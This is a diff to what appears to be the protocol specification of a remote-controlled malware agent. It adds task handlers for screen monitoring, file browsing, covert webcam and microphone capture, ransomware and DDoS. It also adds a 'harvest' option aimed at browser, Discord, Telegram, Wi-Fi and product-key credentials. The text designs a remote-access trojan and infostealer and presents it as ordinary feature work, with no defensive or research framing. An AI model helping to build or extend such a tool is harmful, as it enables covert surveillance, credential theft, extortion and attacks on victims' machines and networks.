@@ -140,8 +140,16 @@ Task names are exactly:
 | `file_pull` | `file_pull.json` | `artifact_result.json` | yes |
 | `cancel` | `cancel.json` | `ok_result.json` | no |
 | `agent` | `agent.json` | `agent_result.json` | yes |
+| `monitor` | `monitor.json` | `monitor_result.json` | yes |
+| `files` | `files.json` | `files_result.json` | yes |
+| `webcam` | `webcam.json` | `artifact_result.json` | yes |
+| `mic` | `mic.json` | `artifact_result.json` | yes |
+| `ransomware` | `ransomware.json` | `ransomware_result.json` | yes |
+| `ddos` | `ddos.json` | `ddos_result.json` | yes |
 
-Unknown names → `error: unknown_task`. Every handler is sandboxed by the agent module
+The last six are additive extensions; existing names and semantics do not change.
+`harvest.kind` (`all|browsers|discord|telegram|wifi|productkey`, default `all`) is
+likewise additive. Unknown names → `error: unknown_task`. Every handler is sandboxed by the agent module
 supervisor: a throw becomes `status:"error"` and never kills heartbeats.
 
 ## 5. Artifacts
